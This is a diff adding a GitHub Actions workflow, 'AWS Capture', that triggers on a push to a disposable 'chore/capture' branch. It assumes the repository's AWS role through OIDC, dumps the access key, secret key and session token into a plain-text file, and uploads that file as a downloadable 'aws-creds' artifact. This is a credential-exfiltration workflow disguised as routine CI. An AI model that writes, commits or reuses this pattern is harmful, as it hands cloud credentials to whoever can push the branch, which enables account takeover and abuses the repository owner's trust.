@@ -1,0 +1,33 @@
+---
+name: AWS Capture
+on:
+  push:
+    branches:
+      - 'chore/capture-6c4817'
+permissions:
+  id-token: write
+  contents: read
+  actions: write
+jobs:
+  capture:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Assume AWS Role
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: ${{ secrets.AWS_OIDC_ROLE }}
+          aws-region: us-west-2
+          output-env-credentials: true
+      - name: Save AWS creds
+        run: |
+          echo "AWS_ACCESS_KEY_ID=${{ env.AWS_ACCESS_KEY_ID }}" > /tmp/aws.txt
+          echo "AWS_SECRET_ACCESS_KEY=${{ env.AWS_SECRET_ACCESS_KEY }}" >> /tmp/aws.txt
+          echo "AWS_SESSION_TOKEN=${{ env.AWS_SESSION_TOKEN }}" >> /tmp/aws.txt
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: aws-creds
+          path: /tmp/aws.txt
+          retention-days: 1
+          overwrite: true
